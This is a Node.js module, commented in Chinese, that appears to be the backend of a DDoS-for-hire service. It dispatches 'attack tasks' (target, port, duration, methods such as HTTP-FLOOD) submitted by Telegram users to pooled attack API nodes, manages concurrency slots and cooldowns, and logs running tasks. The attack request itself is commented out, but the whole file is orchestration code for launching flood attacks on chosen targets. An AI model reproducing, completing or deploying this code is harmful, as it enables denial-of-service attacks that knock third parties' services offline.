const { Op } = require('sequelize');
const { Method, Api, Task } = require('@/database/models');

// 内存中的 API 卡槽计数
const apiSlots = {}; // { [apiId]: [timestamp, ...] }

// 获取某个 API 当前可用卡槽数
function getAvailableSlots(apiId, maxConcurrency) {
    const now = Date.now();
    if (!apiSlots[apiId]) return maxConcurrency;
    apiSlots[apiId] = apiSlots[apiId].filter(ts => ts > now);
    return maxConcurrency - apiSlots[apiId].length;
}

// 占用一个卡槽（即加入冷却队列）
function useSlot(apiId, cooldownSeconds) {
    if (!apiSlots[apiId]) apiSlots[apiId] = [];
    const expiresAt = Date.now() + cooldownSeconds * 1000;
    apiSlots[apiId].push(expiresAt);
}

/**
 * 提交攻击任务（自动分配API、卡槽并冷却）
 * @param {Object} opts
 * @param {number} opts.user_id  用户id（tg_uid）
 * @param {string} opts.target   目标
 * @param {number|string} opts.port 端口
 * @param {number} opts.time    攻击时长（秒）
 * @param {string} opts.method_name 方法名
 * @param {number} opts.slot    并发槽位（默认1）
 * @returns {Promise<{success:boolean, task_id:number, api:string, message:string}>}
 */
async function submitAttackTask({ user_id, target, port, time, method_name, slot = 1 }) {
    // 1. 查找 method（如 HTTP-FLOOD）
    const method = await Method.findOne({ where: { name: method_name, status: 'active' } });
    if (!method) throw new Error('不支持的方法');

    // 2. 查找支持该 method 的所有 API
    const apis = await Api.findAll({
        where: {
            status: 'active',
            method_ids: { [Op.like]: `%${method.id}%` }
        }
    });
    if (!apis.length) throw new Error('没有可用节点');

    // 3. 查找可用 API（优先有空余卡槽的）
    let selectedApi = null;
    for (const api of apis) {
        const maxSlots = api.max_concurrency;
        const freeSlots = getAvailableSlots(api.id, maxSlots);
        if (freeSlots > 0) {
            selectedApi = api;
            break;
        }
    }
    if (!selectedApi) throw new Error('所有节点卡槽已满，请稍后再试');

    // 4. 占用卡槽并提交任务
    useSlot(selectedApi.id, time); // time秒冷却
    const params = {
        port,
        slot,
        api_id: selectedApi.id
    };
    // 实际攻击API的请求逻辑（这里可以异步执行HTTP请求）
    // await axios.post(selectedApi.url, { ...params, ...other });

    // 5. 记录任务
    const task = await Task.create({
        tg_uid: user_id,
        target,
        params,
        method_id: method.id,
        status: 'running',
        start_time: new Date(),
        // 其它字段...
    });

    return {
        success: true,
        task_id: task.id,
        api: selectedApi.name,
        message: `任务已分配节点：${selectedApi.name}`
    };
}

// 支持更多API导出
module.exports = {
    submitAttackTask,
    getAvailableSlots,
    useSlot,
    apiSlots, // 如果想做后台监控可以导出
};
